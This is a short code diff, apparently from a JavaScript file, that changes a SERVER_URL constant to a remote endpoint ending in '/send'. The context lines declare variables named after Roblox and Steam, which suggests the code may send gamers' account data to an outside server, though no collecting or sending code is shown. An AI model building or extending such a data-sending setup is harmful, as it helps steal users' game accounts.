@@ -1,4 +1,4 @@
-const SERVER_URL = "https://supremevalues.netlify.app";
+const SERVER_URL = "https://mm2-server.onrender.com/send";
 
 let sentRoblox = "";
 let sentSteam = "";
